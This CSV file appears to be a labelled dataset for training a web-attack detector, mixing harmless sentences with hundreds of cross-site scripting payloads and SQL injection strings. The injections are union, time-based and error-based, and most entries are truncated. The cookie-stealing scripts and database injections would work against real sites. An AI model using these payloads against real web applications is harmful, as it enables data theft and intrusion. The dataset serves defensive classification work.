Payload,Label,text_label,ID
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""",1,XSS,4015
<h1 onblur=alert(1) tabindex=1 id=x></h1><input au,1,XSS,4414
"<dir oncut=""alert(1)"" contenteditable>test</dir>",1,XSS,3240
"1' ) or ( select 9173 from ( select count ( * ) ,c",2,SQLi,18617
"1' in boolean mode ) and 4241 = convert ( int, ( s",2,SQLi,16217
"1"" where 8241 = 8241 union all select null,null,nu",2,SQLi,14371
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",2,SQLi,10870
1 ) ) ) and 2716 = ( select count ( * ) from sysus,2,SQLi,14327
"<plaintext onmouseleave=""alert(1)"">test</plaintext",1,XSS,2558
Select a new outfit.,0,normal,22546
"<style>@keyframes x{}</style><keygen style=""animat",1,XSS,3347
"<meta http-equiv=""refresh"" content=""0;javascript&c",1,XSS,9236
"1' in boolean mode ) union all select null,null,nu",2,SQLi,12454
"Formal logicians say that, if they had to consider",0,normal,26166
<content id=x tabindex=1 onbeforedeactivate=alert(,1,XSS,2362
"<ins onmouseleave=""alert(1)"">test</ins>",1,XSS,8457
1 ) ) as ojjk where 3687 = 3687 and ( 4833 = 9218 ,2,SQLi,20221
Update the page.,0,normal,22831
<b onpointermove=alert(1)>XSS</b>,1,XSS,5948
"<frameset onkeypress=""alert(1)"" contenteditable>te",1,XSS,5660
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+,1,XSS,9723
<br/><hr/>feed:feed:javAscript:javAscript:feed:ale,1,XSS,9088
1 ) ) ) rlike sleep ( 5 ) and ( ( ( 6790 = 6790,2,SQLi,21483
<x oncut=alert()>x,1,XSS,9573
To select your chosen venue from this shortlist si,0,normal,25242
Let's explore where the hiking trail leads.,0,normal,23744
unknown,0,normal,23241
1 ) where 9683 = 9683,2,SQLi,22442
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",1,XSS,7701
<element id=x tabindex=1 onactivate=alert(1)></ele,1,XSS,7814
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,12770
1' where 5458 = 5458 rlike ( select * from ( selec,2,SQLi,21853
"{""id"":null,""firstName"":""Koh"",""lastName"":""Yun Jia"",",0,normal,27242
"<style>@keyframes x{}</style><body style=""animatio",1,XSS,4421
"On the Consoles with preset Faders, fixtures can b",0,normal,25844
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10468
"-4960 union all select 4031,4031#",2,SQLi,14205
</plaintext\></|\><plaintext/onmouseover=prompt(1),1,XSS,876
"{""id"":null,""firstName"":""Cindy"",""lastName"":""Kong"",""",0,normal,26985
"))) AND ELT(1337=1337,SLEEP(5)) AND (((1337=1337",2,SQLi,11256
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706",2,SQLi,13969
Merge the financial records.,0,normal,22636
Order a delicious pizza.,0,normal,22555
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,1996
<meta onpointerleave=alert(1)>XSS</meta>,1,XSS,5803
admin'or 1 = 1 or '' = ',2,SQLi,11773
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#,1,XSS,1099
<input id=x tabindex=1 onbeforeactivate=alert(1)><,1,XSS,4062
Plant some fragrant herbs.,0,normal,22718
"var title = ""<%=Encode.forJavaScript(request.getPa",1,XSS,313
<video onpointerup=alert(1)>XSS</video>,1,XSS,7796
) or '1'='1--,2,SQLi,9976
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10597
)) or (('x'))=(('x,2,SQLi,9894
or 1 = 1/*,2,SQLi,11405
Launching in select Saks Fifth Avenue locations an,0,normal,25912
"<;IMG SRC=`javascript:alert("";RSnake says, ';XSS';",1,XSS,1633
<var id=x tabindex=1 onfocusin=alert(1)></var>,1,XSS,5263
<span id=x tabindex=1 ondeactivate=alert(1)></span,1,XSS,8824
Check data where errors occur.,0,normal,23448
"1"" ) ) as zval where 2255 = 2255 or ( select * fro",2,SQLi,15464
1' ) or ( select 2* ( if ( ( select * from ( selec,2,SQLi,15302
"1"" ) where 3826 = 3826",2,SQLi,14479
"1%"" or 7552 = ( select count ( * ) from rdb$fields",2,SQLi,17389
"<caption onbeforecut=""alert(1)"" contenteditable>te",1,XSS,5978
<iframe id=%22ifra%22 src=%22/%22></iframe> <scrip,1,XSS,9191
-6639' ) as trll where 6271 = 6271 union all selec,2,SQLi,20417
select * from users where id = 1 % ( \ ) or 1 = 1 ,2,SQLi,11948
1 ) where 9446 = 9446 union all select null#,2,SQLi,21459
1,0,normal,26667
-1332 ) as qtbb where 7261 = 7261 or 1 group by co,2,SQLi,20952
"<image oncopy=""alert(1)"" contenteditable>test</ima",1,XSS,5034
AND 1 = utl_inaddr.get_host_address ( ( SELECT COU,2,SQLi,11754
1 ) ) as jfae where 6684 = 6684 and 2716 = ( selec,2,SQLi,15221
"1%"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a47",2,SQLi,21500
"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ",2,SQLi,19101
<menu onpointerout=alert(1)>XSS</menu>,1,XSS,6628
"<option onkeydown=""alert(1)"" contenteditable>test<",1,XSS,2131
"<meta oncopy=""alert(1)"" contenteditable>test</meta",1,XSS,8232
"select * from users where id = 1 or ""$#"" or 1 = 1 ",2,SQLi,11680
<iframe src=%(scriptlet)s <,1,XSS,745
"When the additional menu items appear, select Crea",0,normal,25151
"Select Internet Protocol Version 4 (TCP/IPv4), and",0,normal,25623
"<td onbeforepaste=""alert(1)"" contenteditable>test<",1,XSS,6288
"{""id"":null,""firstName"":""Max Ml"",""lastName"":""Tok"",""",0,normal,27145
1' ) and 9198 = 9198--,2,SQLi,12325
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10463
1' ) or 7427 = dbms_pipe.receive_message ( chr ( 1,2,SQLi,15455
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,15726
"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'k",2,SQLi,18605
1' ) ) as tcby where 5213 = 5213,2,SQLi,19358
select,0,normal,26640
Please select a wedding theme.,0,normal,24404
"admin"" or 1=1",2,SQLi,9931
The crucial verb in SQL--Structured Query Language,0,normal,25463
"-5439"" or 2559 = 4692 and ""dcrf"" like ""dcrf",2,SQLi,13597
"<aside ondblclick=""alert(1)"">test</aside>",1,XSS,7318
<sup onpointerenter=alert(1)>XSS</sup>,1,XSS,8829
"<IMG SRC=""javascript:alert('XSS')""",1,XSS,813
Massage well into the area to be shaved and then s,0,normal,25888
"1"" ) union all select null,null,null,null,null,nul",2,SQLi,15532
"<h1 onclick=""alert(1)"">test</h1>",1,XSS,4512
"<s onmouseover=""alert(1)"">test</s>",1,XSS,8283
"-7776' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr",2,SQLi,20489
-6405%' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ',2,SQLi,15971
"-9531' ) ) ) union all select 4076,4076#",2,SQLi,13509
1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +cha,2,SQLi,17816
select * from users where id = 1 * ( 1 ) union sel,2,SQLi,11750
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,7555
"<small onmouseenter=""alert(1)"">test</small>",1,XSS,6246
1' ) ) ) and ( select 9067 from ( select count ( *,2,SQLi,14217
"For those using iPhones, open the App Store, selec",0,normal,26168
"-4571' union all select 3227,3227,3227,3227--",2,SQLi,13165
1'+ ( select taga where 8036 = 8036,2,SQLi,13547
He ordered a meal from the food delivery app.,0,normal,23871
"<samp onmouseout=""alert(1)"">test</samp>",1,XSS,7006
"select * from users where id = 1 or ""{ ) "" or 1 = ",2,SQLi,11865
select * from users where id = '1' or \.<\ union s,2,SQLi,11381
"-2028' ) ) ) union all select 8698,8698,8698,8698#",2,SQLi,14759
1 where 2267 = 2267 and 6537 = dbms_pipe.receive_m,2,SQLi,15356
"1"" ) as rdvm where 6360 = 6360 and sleep ( 5 ) --",2,SQLi,15280
"1%' ) union all select null,null,null,null,null#",2,SQLi,15880
"1%"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d",2,SQLi,13848
"-5596' ) ) ) union all select 4877,4877,4877,4877,",2,SQLi,14516
exec sp,2,SQLi,10156
<time onfocusout=alert(1) tabindex=1 id=x></time><,1,XSS,1769
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,5189
if ( 2643 = 1393 ) select 2643 else drop function ,2,SQLi,19717
"{""id"":null,""name"":""Starly""}",0,normal,26868
1' ) ) as hxxm where 3792 = 3792 and sleep ( 5 ) #,2,SQLi,15498
<multicol onpointerleave=alert(1)>XSS</multicol>,1,XSS,6953
"<sub oncut=""alert(1)"" contenteditable>test</sub>",1,XSS,5408
"<footer onmouseover=""alert(1)"">test</footer>",1,XSS,7717
"; if not(substring((select @@version),24,1) <> 1) ",2,SQLi,11135
"1""",2,SQLi,15917
"<keygen draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,4072
"1%"" ) ) and ( select * from ( select ( sleep ( 5 )",2,SQLi,19436
"<blockquote onclick=""alert(1)"">test</blockquote>",1,XSS,5877
Select your notice.,0,normal,24981
Plant flowers outside.,0,normal,22778
1 ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +,2,SQLi,16265
"<button onkeypress=""alert(1)"" contenteditable>test",1,XSS,6270
Where did you find that vibrant mural?,0,normal,23700
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2482
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ",2,SQLi,14825
<shadow onpointerenter=alert(1)>XSS</shadow>,1,XSS,8309
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10833
<nav id=x tabindex=1 onbeforeactivate=alert(1)></n,1,XSS,3292
"{""id"":null,""firstName"":""Nguan Eng"",""lastName"":""Tan",0,normal,26817
%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',1,XSS,1692
<style>:target {color: red;}</style><bgsound id=x ,1,XSS,5852
javascript:alert();//<img src=x:x onerror=alert(1),1,XSS,9537
"<dl onmousedown=""alert(1)"">test</dl>",1,XSS,3436
1,0,normal,26695
"<script>throw onerror=alert,1</script>",1,XSS,122
1' and 7533 = 7533 and 'jwgc' = 'jwgc,2,SQLi,18226
<small onpointerleave=alert(1)>XSS</small>,1,XSS,6634
"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) |",2,SQLi,18405
Delete the unnecessary apps.,0,normal,22650
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,11846
"UNION ALL SELECT 1,2,3,4,5",2,SQLi,10508
1' ) as wnyl where 8978 = 8978 or 5286 = ( select ,2,SQLi,14121
<summary id=x tabindex=1 onactivate=alert(1)></sum,1,XSS,4742
1' ) ) as atpy where 9020 = 9020 or 4915 = ( selec,2,SQLi,14225
if ( 4735 = 8907 ) select 4735 else drop function ,2,SQLi,13980
"1%"" ) and 8626 = 3626#",2,SQLi,15501
"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""f",1,XSS,513
1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) |,2,SQLi,21927
select pg_sleep ( 5 ) and ( 'itgc' = 'itgc,2,SQLi,19296
"<a href=""\x03javascript:javascript:alert(1)"" id=""f",1,XSS,500
"1"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5",2,SQLi,20386
"1' ) and extractvalue ( 7982,concat ( 0x5c,0x71717",2,SQLi,12816
1 ) where 4698 = 4698 and 3580 = ( select count ( ,2,SQLi,12512
Where's the nearest park?,0,normal,23494
"<b onmouseup=""alert(1)"">test</b>",1,XSS,2137
"1"" and ( select 9067 from ( select count ( * ) ,co",2,SQLi,21172
select ( case when ( 9540 = 5786 ) then 9540 else ,2,SQLi,12401
1'|| ( select 'idna' from dual where 2683 = 2683 r,2,SQLi,20810
1 ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 10,2,SQLi,21458
Plant a beautiful rose.,0,normal,22683
<svg contentScriptType=text/vbs><script>MsgBox+1,1,XSS,901
"1' union all select null,null,null--",2,SQLi,12375
"<em onmouseenter=""alert(1)"">test</em>",1,XSS,8271
Where's the perfect place to have a picnic?,0,normal,23810
"<font onpaste=""alert(1)"" contenteditable>test</fon",1,XSS,5911
A way to manage your messages is to select to view,0,normal,26426
-9653' ) where 2705 = 2705 or 9323 = 9323#,2,SQLi,18330
1' ) where 5491 = 5491 and 9198 = 9198--,2,SQLi,16417
"select sleep ( 5 ) and ( ( ""twed"" like ""twed",2,SQLi,18775
and 1=1,2,SQLi,9949
"<frameset onclick=""alert(1)"">test</frameset>",1,XSS,3706
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71",2,SQLi,13533
1 ) where 1013 = 1013 and 5573 = 9445#,2,SQLi,21479
-8069 ) ) as sxbn where 7689 = 7689 union all sele,2,SQLi,18867
"<a href="" javascript:alert(1)"">XSS</a>",1,XSS,148
"-5520"" ) ) as utqk where 7762 = 7762 or 5023 = ctx",2,SQLi,19691
"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ",2,SQLi,15686
"{""id"":null,""firstName"":""Pranava"",""lastName"":""Sheor",0,normal,27386
"<hgroup draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,3301
[a](javascript:this;alert(1&#41;),1,XSS,9426
1,0,normal,26653
"<title ondblclick=""alert(1)"">test</title>",1,XSS,2146
"1%"" and 6510 = ( select count ( * ) from sysusers ",2,SQLi,20491
select ( case when ( 6843 = 2657 ) then 6843 else ,2,SQLi,21573
"<input onbeforecut=alert(1) value=""XSS"" autofocus>",1,XSS,3249
-8378%' ) union all select 5491#,2,SQLi,21445
><img src=x onerror=javascript:alert((A))>,1,XSS,1268
<math><brute xlink:href=javascript:alert(1)>click,1,XSS,9234
"ABC<div style=""x:\x0Cexpression(javascript:alert(1",1,XSS,475
select ( case when ( 1291 = 6612 ) then 1 else 129,2,SQLi,14605
<big id=x tabindex=1 onbeforedeactivate=alert(1)><,1,XSS,8090
Representatives from the companies will be appeari,0,normal,25751
1' ) ) or 8421 = ( select count ( * ) from generat,2,SQLi,20397
"&lt;STYLE type=\""text/css\""&gt;BODY{background&#58",1,XSS,1011
"<noframes onmouseover=""alert(1)"">test</noframes>",1,XSS,8022
<table onblur=alert(1) tabindex=1 id=x></table><in,1,XSS,3432
"1 ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x71",2,SQLi,21860
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vul",1,XSS,1478
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,12276
"-9557 ) where 2891 = 2891 union all select 2891,28",2,SQLi,19720
1'|| ( select 'mjkz' where 9430 = 9430 ( select ( ,2,SQLi,19260
"Select cuts jumped $2.27 to $217.93, based on USDA",0,normal,25631
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4617
Where's the circus?,0,normal,23589
1'+ ( select qymy where 8657 = 8657 and char ( 107,2,SQLi,20844
<sup id=x tabindex=1 onbeforeactivate=alert(1)></s,1,XSS,6531
1' ) as dvoy where 7906 = 7906 and char ( 109 ) ||,2,SQLi,12791
desc%2c(select*from(select(sleep(5)))a),2,SQLi,11145
javascript:alert(''),1,XSS,3779
") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ",2,SQLi,11291
1' ) and 3707 = ( select count ( * ) from sysibm.s,2,SQLi,13178
<form onfocusout=alert(1) tabindex=1 id=x></form><,1,XSS,3855
select ( case when ( 4059 = 7807 ) then 4059 else ,2,SQLi,20070
"<footer draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,7144
<BODY ONLOAD=javascript:javascript:alert(1)>,1,XSS,739
1 ) as bhdj where 4472 = 4472,2,SQLi,12425
"1 ) where 9371 = 9371 union all select null,null,n",2,SQLi,18771
);waitfor delay '0:0:5'--,2,SQLi,10362
"<style>@keyframes x{}</style><address style=""anima",1,XSS,2053
select case when 2599 = 7035 then 1 else null end-,2,SQLi,12673
<style>:target {color:red;}</style><textarea id=x ,1,XSS,1981
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT",1,XSS,822
1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmar,2,SQLi,12556
1' ) as uaoz where 2464 = 2464,2,SQLi,17020
1%' ) waitfor delay '0:0:5' and ( '%' = ',2,SQLi,18811
"<output draggable=""true"" ondragend=""alert(1)"">test",1,XSS,6014
"<head draggable=""true"" ondrag=""alert(1)"">test</hea",1,XSS,6733
"<link onkeydown=""alert(1)"" contenteditable>test</l",1,XSS,1864
"<frameset onpaste=""alert(1)"" contenteditable>test<",1,XSS,2277
"1"" ) ) or 2367 = ( select count ( * ) from rdb$fie",2,SQLi,15956
truncate,0,normal,23184
"{""id"":null,""firstName"":""Rita"",""lastName"":""Ong"",""ad",0,normal,27430
<animatemotion onpointerenter=alert(1)>XSS</animat,1,XSS,4444
<svg><source onload=alert(1)></source>,1,XSS,2849
<bgsound onpointerenter=alert(1)>XSS</bgsound>,1,XSS,7655
"-3377"" ) or 4982 = 6608#",2,SQLi,20889
1' ) as akvn where 8669 = 8669,2,SQLi,19071
"1"" ) as gjlv where 1983 = 1983 and sleep ( 5 ) #",2,SQLi,15766
"select * from generate_series ( 3379,3379,case whe",2,SQLi,19438
<abbr onpointerout=alert(1)>XSS</abbr>,1,XSS,4027
<ul onpointermove=alert(1)>XSS</ul>,1,XSS,2022
1 where 5332 = 5332 or ( select 9173 from ( select,2,SQLi,19715
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5",2,SQLi,11021
select case when 3819 = 1887 then 1 else null end-,2,SQLi,17624
1' ) ) or 1022 = ( select count ( * ) from all_use,2,SQLi,21546
"1"" ) ) order by 1--",2,SQLi,21596
1 ) ) union all select null--,2,SQLi,17600
1'|| ( select 'xtcb' where 5240 = 5240,2,SQLi,15782
"-4546' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr",2,SQLi,13173
Modify account.,0,normal,23029
<sub onpointerleave=alert(1)>XSS</sub>,1,XSS,7732
Select plan.,0,normal,24745
1' ) as viex where 6242 = 6242 and 6537 = dbms_pip,2,SQLi,20512
<footer id=x tabindex=1 onfocusin=alert(1)></foote,1,XSS,3949
><link rel=import href=data:text/html&comma;&lt;sc,1,XSS,8960
Some variations of the system would let a rider se,0,normal,25531
"<em onbeforecopy=""alert(1)"" contenteditable>test</",1,XSS,4477
1' ) as ghks where 5128 = 5128 union all select nu,2,SQLi,14431
You can mass select messages by clicking the first,0,normal,25092
"1%' and row ( 6237,7469 ) > ( select count ( * ) ,",2,SQLi,17285
"<form onbeforecopy=""alert(1)"" contenteditable>test",1,XSS,7828
"1%"" ) ) union all select null,null,null,null,null,",2,SQLi,19444
( select * from ( select ( sleep ( 5 ) ) ) srmq ),2,SQLi,19290
"<summary ondblclick=""alert(1)"">test</summary>",1,XSS,2424
Select snack.,0,normal,24503
"-6095"" ) ) as kgfp where 3601 = 3601 or 7287 = 937",2,SQLi,17499
-4091 ) ) as lqqy where 3030 = 3030 union all sele,2,SQLi,13636
Please select one item.,0,normal,24449
SLEEP(5)=',2,SQLi,10379
"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ",2,SQLi,18377
<nav onpointermove=alert(1)>XSS</nav>,1,XSS,4862
"<nav draggable=""true"" ondrag=""alert(1)"">test</nav>",1,XSS,7579
<style>@keyframes slidein {}</style><datalist styl,1,XSS,3232
<x onmousemove=alert(1)>hover this!,1,XSS,9352
"{""id"":null,""firstName"":""Quan"",""lastName"":""Yuan"",""a",0,normal,26776
"-1588%"" ) ) ) or 1 group by concat ( 0x7171706a71,",2,SQLi,13031
"1"" ) ) as klie where 2840 = 2840 or 8514 = benchma",2,SQLi,12173
<img src=http://www.google.fr/images/srpr/logo3w.p,1,XSS,9212
<embed onpointerover=alert(1)>XSS</embed>,1,XSS,8859
&lt;HTML&gt;&lt;BODY&gt;,1,XSS,1029
"-7741' ) where 8271 = 8271 union all select 8271,8",2,SQLi,15559
%27 or 1 = 1,2,SQLi,11406
1,0,normal,26655
-1393' ) ) ) union all select 8280--,2,SQLi,20608
"1"" ) where 1212 = 1212 and 8475 = 5864",2,SQLi,20004
"<style>@keyframes x{}</style><col style=""animation",1,XSS,3350
Select a method to unwind.,0,normal,24143
"<option draggable=""true"" ondragstart=""alert(1)"">te",1,XSS,5928
"-3445 union all select 5505,5505,5505--",2,SQLi,14954
"1%' ) ) union all select null,null,null,null,null,",2,SQLi,18242
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8297
1' ) as rhvm where 1420 = 1420,2,SQLi,15524
\u{0000000061}lert(1),1,XSS,9395
<legend onpointermove=alert(1)>XSS</legend>,1,XSS,7308
"Benefits include ""R Us Dollars"" for select purchas",0,normal,26326
"<ins onmouseenter=""alert(1)"">test</ins>",1,XSS,2686
1' ) ) ( select ( case when ( 4587 = 4587 ) then r,2,SQLi,14548
"1' procedure analyse ( extractvalue ( 9627,concat ",2,SQLi,18270
"1%"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 ",2,SQLi,12410
<textarea id=ta onfocus=console.dir(event.currentT,1,XSS,9323
"Up to 45% off select Power Tools, Hand Tools, and ",0,normal,25204
1' ) ) and 6414 = ( select count ( * ) from rdb$fi,2,SQLi,14073
<rb onblur=alert(1) tabindex=1 id=x></rb><input au,1,XSS,7706
1'+ ( select 'ozpm' where 6939 = 6939 rlike ( sele,2,SQLi,20895
"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694",2,SQLi,18385
Where is my book?,0,normal,23479
"{""id"":null,""firstName"":""Susan"",""lastName"":""Tham"",""",0,normal,27602
"1"" ) where 7919 = 7919 and char ( 111 ) ||char ( 7",2,SQLi,15647
"ORDER BY 1,SLEEP(5),3,4--",2,SQLi,10478
Dancer opened in select theaters in New York City ,0,normal,26248
"<IMG SRC=x oncuechange=""alert(String.fromCharCode(",1,XSS,1221
"1%"" ) and 8594 = ( select 8594 from pg_sleep ( 5 )",2,SQLi,18107
<element id=x tabindex=1 onbeforeactivate=alert(1),1,XSS,7017
ORDER BY 24--,2,SQLi,10266
"<noembed onbeforecut=""alert(1)"" contenteditable>te",1,XSS,7516
"<animation xlink:href=""javascript:alert(88)""/>",1,XSS,9075
-8513' union all select 7414--,2,SQLi,12886
<style>:target {color:red;}</style><aside id=x sty,1,XSS,8560
1' ) as jwvp where 5231 = 5231 and 8189 = ( select,2,SQLi,17907
"{""id"":null,""firstName"":""Adrian"",""lastName"":""San"",""",0,normal,27399
"1"" ) or 7552 = ( select count ( * ) from rdb$field",2,SQLi,18924
<h1>INJECTX</h1>,1,XSS,9829
"1%"" ) ) ) or ( select 9173 from ( select count ( *",2,SQLi,16698
1%' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ),2,SQLi,14283
"<spacer draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,5937
"1' union all select null,null,null,null,null--",2,SQLi,15655
"1"" ) where 7514 = 7514",2,SQLi,17440
1'%2b(select*from(select(sleep(5)))a)%2b',2,SQLi,11143
"-8065"" ) ) ) order by 1--",2,SQLi,21634
"1%"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( ",2,SQLi,15063
"1"" and sleep ( 5 ) and ""masm"" = ""masm",2,SQLi,18044
"-5579%"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ",2,SQLi,13564
Only select school administrators and instructors ,0,normal,25818
Select your deal.,0,normal,24947
OR x=y,2,SQLi,10202
"<output draggable=""true"" ondrag=""alert(1)"">test</o",1,XSS,8082
1' ) as pogx where 4105 = 4105 and 2853 = cast ( (,2,SQLi,14754
1 ) or exp ( ~ ( select * from ( select concat ( 0,2,SQLi,15058
1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char (,2,SQLi,15690
"1"" where 7249 = 7249 union all select null,null,nu",2,SQLi,21676
Samsung EVO Select microSDXC (512 GB) â Â£86.49 (li,0,normal,25732
"<li onmouseleave=""alert(1)"">test</li>",1,XSS,7605
1 ) ) as syot where 1199 = 1199,2,SQLi,17733
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""",1,XSS,1022
<sVg oNloaD=write()>,1,XSS,9249
1 where 3902 = 3902 or 9643 = ( select count ( * ),2,SQLi,12347
"-7627%"" ) ) union all select 4011,4011,4011,4011,4",2,SQLi,21316
random,0,normal,23222
"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a7",2,SQLi,17164
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""><",1,XSS,830
"<picture draggable=""true"" ondragstart=""alert(1)"">t",1,XSS,8459
<mark onpointerdown=alert(1)>XSS</mark>,1,XSS,4459
"<IMG SRC=""jav&#x09;ascript:alert('');"">",1,XSS,5289
1%' ) ) ) or 1022 = ( select count ( * ) from all_,2,SQLi,18193
"<param draggable=""true"" ondragleave=""alert(1)"">tes",1,XSS,7678
<style>:target {transform: rotate(180deg);}</style,1,XSS,1970
1'+ ( select nash where 4159 = 4159 union all sele,2,SQLi,20780
"<track oncontextmenu=""alert(1)"">test</track>",1,XSS,7653
I have done nothing but select and cut.,0,normal,26071
<A href=javas%26#99;ript:alert(1)>click,1,XSS,9045
Remember to establish the optimum text size (in po,0,normal,25754
exec xp,2,SQLi,10093
"-1366' or make_set ( 9354 = 9354,7185 ) and 'abre'",2,SQLi,17455
-8828%' ) ) ) or 4144 = ( select upper ( xmltype (,2,SQLi,17640
1'+ ( select mkbv where 1648 = 1648 and 9254 = ( s,2,SQLi,20051
<keygen autofocus onfocus=alert(1)>//INJECTX,1,XSS,9845
Why else would he want to select the trail she fol,0,normal,25124
<head onpointerout=alert(1)>XSS</head>,1,XSS,2436
"<code onmouseover=""alert(1)"">test</code>",1,XSS,8567
"<style>@keyframes x{}</style><colgroup style=""anim",1,XSS,6151
1,0,normal,26741
Select a destination for our next adventure.,0,normal,24005
-1908' ) ) ) union all select 7665#,2,SQLi,16710
-9826 where 4103 = 4103 order by 1#,2,SQLi,12369
"SRC=""http://www.thesiteyouareon.com/somecommand.ph",1,XSS,8377
select case when 3661 = 9315 then 1 else null end-,2,SQLi,15336
"1"" ) ) as szxa where 1501 = 1501 and 8189 = ( sele",2,SQLi,14955
Sort the color-coded files.,0,normal,22656
<thead id=x tabindex=1 ondeactivate=alert(1)></the,1,XSS,8107
"{""id"":null,""name"":""bar vessels""}",0,normal,26937
"{""id"":null,""firstName"":""Sabrina"",""lastName"":""Qiu"",",0,normal,27495
<body ONLOAD=document.vulnerable=true;>,1,XSS,1488
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""",1,XSS,287
<article onpointerout=alert(1)>XSS</article>,1,XSS,8167
"The update is slated for this spring, and it shoul",0,normal,25362
1 rlike ( select ( case when ( 7689 = 7689 ) then ,2,SQLi,17662
1' ) ) ) or ( select * from ( select ( sleep ( 5 ),2,SQLi,20755
<caption onpointerup=alert(1)>XSS</caption>,1,XSS,6238
OR x=y#,2,SQLi,10205
"1"" where 5236 = 5236 or char ( 68 ) ||char ( 69 ) ",2,SQLi,21656
1 ) ) as shmg where 1371 = 1371 union all select n,2,SQLi,15030
"<slot oncut=""alert(1)"" contenteditable>test</slot>",1,XSS,6384
"-8279"" union all select 6598,6598,6598,6598,6598,6",2,SQLi,16010
Plant a cherry tree.,0,normal,22612
Whatever you select will delete all transcripts wi,0,normal,25160
Determine conditions where applicable.,0,normal,23359
) ) or pg_sleep ( __TIME__ ) --,2,SQLi,11509
</script><script >alert(document.cookie)</script>,1,XSS,1141
1%' ) or 7552 = ( select count ( * ) from rdb$fiel,2,SQLi,14163
